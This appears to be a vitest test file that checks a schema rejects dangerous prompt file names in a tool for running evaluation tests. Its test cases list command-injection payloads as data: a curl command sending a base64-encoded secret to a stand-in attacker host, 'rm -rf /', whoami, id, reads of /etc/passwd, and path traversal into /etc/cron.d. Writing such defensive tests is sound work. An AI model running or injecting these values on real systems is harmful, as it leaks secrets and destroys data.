import { describe, it, expect } from 'vitest';
import { runEvaluationTestsInputSchema } from './inputSchema.js';

describe('runEvaluationTestsInputSchema fileName validation', () => {
  const parse = (fileName: string) =>
    runEvaluationTestsInputSchema.safeParse({
      projectSlug: 'gh/org/repo',
      branch: 'main',
      promptFiles: [{ fileName, fileContent: 'name: poc\n' }],
    });

  it('accepts ordinary prompt file names', () => {
    expect(parse('bedtime-story-generator.prompt.yml').success).toBe(true);
    expect(parse('test_1.prompt.json').success).toBe(true);
  });

  it('rejects shell metacharacters used for command injection', () => {
    const payloads = [
      'x.yml; curl https://attacker.example/?leak=$(printf %s "$SECRET" | base64); #',
      'x.yml; rm -rf /',
      'x.yml`whoami`',
      'x.yml$(id)',
      'x.yml | cat /etc/passwd',
      'x.yml && echo pwned',
      "x'.yml",
      'file with spaces.yml',
    ];
    for (const fileName of payloads) {
      expect(parse(fileName).success, fileName).toBe(false);
    }
  });

  it('rejects path traversal and absolute paths', () => {
    expect(parse('../../etc/cron.d/evil').success).toBe(false);
    expect(parse('/etc/passwd').success).toBe(false);
    expect(parse('sub/dir/file.yml').success).toBe(false);
  });
});
